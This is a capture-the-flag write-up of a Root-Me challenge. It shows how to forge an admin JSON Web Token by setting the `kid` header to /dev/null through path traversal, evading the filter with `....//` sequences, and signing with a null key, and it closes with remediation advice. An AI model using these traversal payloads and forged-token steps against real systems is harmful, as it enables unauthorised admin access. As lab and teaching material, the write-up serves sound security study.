# CTF Writeup: JWT: Unsecure File Signature

**Platform:** Root-Me  
**Category:** Web: Client  
**Difficulty:** Medium  
**Topic:** JWT `kid` Parameter: Directory Traversal & Null Signature Bypass

---

## 🎯 Challenge Overview

In this challenge, a web application uses **JSON Web Tokens (JWT)** for authentication. The token contains a `kid` (Key ID) parameter in the header that points to a file on the server used to **verify the token's signature**. The goal is to escalate privileges from `guest` to `admin`.

---

## 🔍 Reconnaissance

After logging in as a guest user, the application issues a JWT. Decoding it reveals the following structure:

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "keys/secret.key"
}
```

**Payload:**
```json
{
  "user": "guest"
}
```

The `kid` field is noteworthy: it tells the server **which file to read** as the HMAC signing secret.

---

## 🧠 Vulnerability Analysis

The `kid` parameter is passed directly to a file-reading operation on the server **without sanitization**. This opens the door to a **directory traversal attack**.

The attack plan:
1. Use `kid` to point to `/dev/null`: a file that always returns **empty content (null bytes)**
2. Sign the forged token with a **null/empty secret** (`AA==` in base64, which decodes to a null byte `\x00`)
3. Change the payload's `user` field from `guest` to `admin`

> 📚 Reference: [PortSwigger: Injecting self-signed JWTs via the `kid` parameter](https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter)

---

## 🛠️ Tools Used

- **Burp Suite**: Intercepting and modifying HTTP requests
- **JWT Editor** (Burp Extension): Creating and signing custom JWT tokens
- **JSON Web Tokens** (Burp Extension): Decoding and inspecting JWT structure

---

## ⚔️ Exploitation

### Step 1: Intercept the JWT

Using Burp Suite, I intercepted the request containing the JWT token and sent it to **Repeater** for manipulation.

---

### Step 2: Attempt 1: Basic Path Traversal

I modified the `kid` parameter in the JWT header to traverse up to `/dev/null`:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../../dev/null"
}
```

And changed the payload to:
```json
{
  "user": "admin"
}
```

This attempt failed: the server likely had a basic filter blocking `../` sequences.

---

### Step 3: Attempt 2: Filter Bypass with Obfuscated Traversal

To bypass the filter, I used a well-known **double-encoding trick** where `....//` collapses to `../` after the filter strips `./`:

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "....//....//....//....//....//....//dev/null"
}
```

**Payload:**
```json
{
  "user": "admin"
}
```

✅ This successfully resolved to `/dev/null` on the server.

---

### Step 4: Sign with Null Secret

Since `/dev/null` returns empty content, the server uses a **null/empty byte** as the HMAC secret. In **JWT Editor** (Burp Extension):

1. Created a new **Symmetric Key**
2. Set the key value to `AA==` (base64 encoding of a null byte `\x00`)
3. Used this key to **sign the forged token**

The resulting JWT was crafted with admin privileges and a valid signature verified against an empty secret.

---

### Step 5: Send the Forged Token

I sent the modified request with the forged JWT in the `Authorization` header:

```
Authorization: Bearer <forged_jwt>
```

The server accepted the token, recognized the user as `admin`, and returned the **flag**. 🎉

---

## 🔑 Key Concepts

| Concept | Description |
|---|---|
| `kid` (Key ID) | JWT header param that specifies which key to use for signature verification |
| Directory Traversal | Using `../` sequences to escape the intended directory and access arbitrary files |
| `/dev/null` | A special Unix file that always returns empty/null content |
| Null Byte Signing | Signing a JWT with an empty secret when the server reads from `/dev/null` |
| Filter Bypass (`....//`) | Obfuscating `../` to bypass naive path traversal filters |

---

## 🛡️ Remediation

To prevent this class of vulnerability:

- **Validate and whitelist** the `kid` parameter: never allow it to be a user-controlled file path
- Use a **key store or database** instead of file-based key lookups
- **Sanitize** all path inputs to block traversal sequences (both `../` and obfuscated variants)
- Reject tokens signed with an **empty or null secret**
- Consider using **asymmetric algorithms** (RS256, ES256) where the public key is embedded or hardcoded

---

## 📎 References

- [PortSwigger Web Security Academy: JWT Attacks](https://portswigger.net/web-security/jwt)
- [PortSwigger: `kid` Parameter Injection](https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-kid-parameter)
- [Root-Me: JWT Unsecure File Signature](https://www.root-me.org)
